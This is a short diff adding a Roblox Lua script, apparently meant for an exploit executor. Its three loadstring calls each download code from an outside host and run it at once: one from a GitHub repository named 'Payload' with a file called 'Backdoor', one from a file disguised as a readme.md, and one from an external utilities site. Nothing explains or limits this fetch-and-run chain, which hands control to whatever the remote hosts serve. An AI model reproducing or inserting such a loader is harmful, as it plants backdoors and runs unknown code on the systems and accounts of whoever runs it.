@@ -1,0 +1,7 @@
+wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/hhhhhhhhhhhhhhhhhhhhhhhok/main/readme.md",true))()
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImTimmy228/Payload/main/Backdoor",true))()
+wait(1)
+loadstring(((syn and syn.request) or request or http_request)({Url = "https://www.stenutilities.com/babft"})["Body"])()
